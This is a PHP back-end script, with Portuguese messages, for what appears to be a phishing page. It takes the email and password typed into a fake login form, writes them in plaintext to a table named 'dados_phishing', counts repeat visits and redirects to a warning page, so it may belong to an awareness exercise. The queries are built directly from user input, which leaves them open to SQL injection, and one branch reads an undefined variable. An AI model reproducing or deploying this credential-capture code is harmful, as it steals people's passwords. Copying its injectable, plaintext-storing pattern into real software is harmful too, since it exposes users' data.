<?php
 include("connection.php");

    if(isset($_POST["userEmail"]) && isset($_POST['userPassword'])){
    	$userMAIL = $_POST['userEmail'];
        $userPass = $_POST['userPassword'];

        if(empty($userMAIL)) {
            echo'<script>alert("Preencha seu Usuário");</script>';

        } elseif (empty($userPass)) {
            echo 'alert("Preencha sua Senha");';
        
        } else {    
            $sql_userMAIL = "SELECT * FROM dados_phishing WHERE email = '$userMAIL'";
            $sql_query = $mysqli->query($sql_userMAIL) or die("Falha na execução do código SQL: ".mysqli_error($mysqli));
            $quantidade_userMAIL = $sql_query->num_rows;

            if($quantidade_userMAIL == 1){
                $data = mysqli_fetch_assoc(mysqli_query($mysqli, "SELECT * FROM dados_phishing WHERE email = '$userMAIL'"));
                $visits = $data['visits'];
                $sql="UPDATE dados_phishing SET visits = $visits + 1 WHERE email = '$userMAIL'";
                
                if(mysqli_query($mysqli, $sql)) {
                    echo "Cadastrado com sucesso";
                    session_start();
                    $_SESSION["mail"] = $data["email"];
                    $_SESSION["passw"] = $data["password"];
                    $_SESSION["visits"] = $data["visits"];
                    header("Location: aviso.php");
                
                }else {
                    echo"Error". mysqli_error($mysqli);
                }

            } else {
                $sql2="INSERT INTO dados_phishing(email, password) VALUES ('$userMAIL', '$userPass')";

                if(mysqli_query($mysqli, $sql2)) {
                    echo "Cadastrado com sucesso";
                    session_start();
                    $_SESSION["mail"] = $data["userMAIL"];
                    $_SESSION["passw"] = $data["userPassword"];
                    $_SESSION["visits"] = $data["visits"];
                    header("Location: aviso.php");
                
                }else {
                    echo"Error". mysqli_error($mysqli);
                }
            
            }
        }
}
mysqli_close($mysqli);
?>